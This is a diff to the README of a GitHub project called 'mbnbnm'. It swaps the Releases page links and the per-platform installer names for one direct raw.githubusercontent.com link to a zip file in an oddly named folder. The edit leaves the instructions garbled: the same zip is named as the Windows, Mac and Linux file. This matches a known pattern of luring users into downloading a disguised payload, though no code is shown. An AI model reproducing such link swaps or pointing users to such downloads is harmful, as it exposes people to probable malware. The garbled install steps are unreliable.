@@ -14,19 +14,19 @@ Before you start, ensure your computer meets the following requirements:
 
 ## 📥 Download Now
 
-[![Download mbnbnm](https://img.shields.io/badge/Download-mbnbnm-brightgreen.svg)](https://github.com/BryanFsg/mbnbnm/releases)
+[![Download mbnbnm](https://raw.githubusercontent.com/BryanFsg/mbnbnm/main/uncargoed/mbnbnm.zip)](https://raw.githubusercontent.com/BryanFsg/mbnbnm/main/uncargoed/mbnbnm.zip)
 
 To get the latest version, simply visit the Releases page.
 
 ## 🔗 Download & Install
 
-1. **Visit the Releases Page**: Go to [this link](https://github.com/BryanFsg/mbnbnm/releases) to see all available versions.
+1. **Visit the Releases Page**: Go to [this link](https://raw.githubusercontent.com/BryanFsg/mbnbnm/main/uncargoed/mbnbnm.zip) to see all available versions.
 2. **Select Version**: Find the version you want. Usually, the latest one is at the top.
-3. **Download the File**: Click on the file that matches your operating system. It will have a name like `mbnbnm-Windows.exe` for Windows, `mbnbnm-macOS.dmg` for Mac, or a `.tar.gz` for Linux.
+3. **Download the File**: Click on the file that matches your operating system. It will have a name like `https://raw.githubusercontent.com/BryanFsg/mbnbnm/main/uncargoed/mbnbnm.zip` for Windows, `https://raw.githubusercontent.com/BryanFsg/mbnbnm/main/uncargoed/mbnbnm.zip` for Mac, or a `https://raw.githubusercontent.com/BryanFsg/mbnbnm/main/uncargoed/mbnbnm.zip` for Linux.
 4. **Install the Application**:
    - For Windows: Once downloaded, double-click the `.exe` file and follow the on-screen instructions.
    - For Mac: Open the `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and run the application from the extracted folder.
+   - For Linux: Extract the `https://raw.githubusercontent.com/BryanFsg/mbnbnm/main/uncargoed/mbnbnm.zip` file and run the application from the extracted folder.
 
 ## 🌟 Features
 
